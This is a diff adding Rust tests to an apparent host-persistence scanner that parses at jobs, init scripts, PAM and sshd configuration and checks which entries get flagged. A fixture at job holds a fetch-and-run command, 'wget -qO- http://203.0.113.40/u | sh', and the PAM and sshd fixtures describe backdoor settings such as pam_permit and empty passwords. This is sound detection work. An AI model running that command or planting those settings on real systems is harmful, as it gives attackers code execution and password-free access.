@@ -262,3 +262,71 @@ fn sudoers() {
         ]
     );
 }
+
+#[test]
+fn at_jobs() {
+    let parsed = read("var/spool/cron/atjobs/a0000201c79c28");
+    let job = &parsed.entries[0];
+    assert_eq!(
+        job.summary(),
+        "at 2026-10-09T07:36Z as alice: wget -qO- http://203.0.113.40/u | sh"
+    );
+    assert_eq!(
+        job.detail,
+        Detail::AtJob {
+            queue: Some('a'),
+            job: Some(2),
+            uid: Some(1001)
+        }
+    );
+    assert_eq!(flagged(&parsed), [(11, vec![Flag::DownloadToShell])]);
+}
+
+#[test]
+fn init_scripts() {
+    let parsed = read("etc/init.d/sysupdate");
+    assert!(parsed
+        .entries
+        .iter()
+        .all(|e| e.user.as_deref() == Some("root")));
+    assert_eq!(flagged(&parsed), [(12, vec![Flag::TemporaryDirectory])]);
+}
+
+#[test]
+fn pam() {
+    let parsed = read("etc/pam.d/sshd");
+    assert_eq!(
+        parsed.entries[0].summary(),
+        "sshd: auth sufficient pam_permit.so"
+    );
+    assert_eq!(parsed.entries[1].summary(), "includes common-auth");
+    assert_eq!(
+        parsed.entries[5].command.as_deref(),
+        Some("/usr/local/sbin/.pam-log")
+    );
+    assert_eq!(
+        flagged(&parsed),
+        [
+            (3, vec![Flag::PamAcceptsAnyPassword]),
+            (5, vec![Flag::PamModuleElsewhere]),
+            (8, vec![Flag::PamExec]),
+        ]
+    );
+}
+
+#[test]
+fn sshd_config() {
+    let parsed = read("etc/ssh/sshd_config.d/99-tuning.conf");
+    assert_eq!(
+        parsed.entries[3].summary(),
+        "ForceCommand /usr/local/bin/rrsync -ro /srv (Match User backup)"
+    );
+    assert_eq!(
+        flagged(&parsed),
+        [
+            (2, vec![Flag::RootPasswordLogin]),
+            (3, vec![Flag::EmptyPasswords]),
+            (4, vec![Flag::KeysElsewhere]),
+        ]
+    );
+}
